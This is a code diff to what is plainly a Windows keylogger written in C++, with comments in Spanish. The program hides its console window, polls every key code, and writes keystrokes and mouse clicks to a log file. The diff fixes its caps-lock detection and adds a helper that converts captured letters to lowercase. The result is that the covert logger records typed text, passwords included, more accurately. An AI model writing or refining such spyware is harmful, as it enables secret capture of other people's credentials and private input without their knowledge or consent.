@@ -5,7 +5,7 @@
 using namespace std;
 
 void hideConsole(void);
-int getMinusc(char letter);
+int getLowerKey(int letter);
 
 int main(int nArgs, char* argv[]){
 	hideConsole();
@@ -24,7 +24,7 @@ int main(int nArgs, char* argv[]){
 	}
 	log.close();
 	int count = 0;
-	bool mayusc = false;
+	bool mayusc = true;
 	int chr = 0;
 	while(true){
 		for(chr=0;chr<=255;chr++){
@@ -36,12 +36,15 @@ int main(int nArgs, char* argv[]){
 					case 2:log<<"[CLICK DERECHO]";break;
 					case 8:log<<"[TAB]";break;
 					case 12:log<<"[ALT]";break;
-					case 14:
+					case 20:
 					    if(mayusc){mayusc=false;}
 					    else{mayusc=true;}
 					break;
 					default:
-					log<<char(chr);
+					    if(mayusc){
+					    	chr = getLowerKey(chr);
+					    }
+					    log<<char(chr);
 				}
 				if(count == 50){
 					cout<<endl;
@@ -62,4 +65,17 @@ int main(int nArgs, char* argv[]){
 void hideConsole(void){
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 	return;
+}
+
+int getLowerKey(int letter){
+	int low = letter, i= 0;
+	string abc ("abcdefghijklmnopqrstuvwxyz");
+	string ABC ("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
+	for(i;i<26;i++){
+		if(ABC[i] == char(letter)){
+			low = int(abc[i]);
+			break;
+		}
+	}
+	return low;
 }
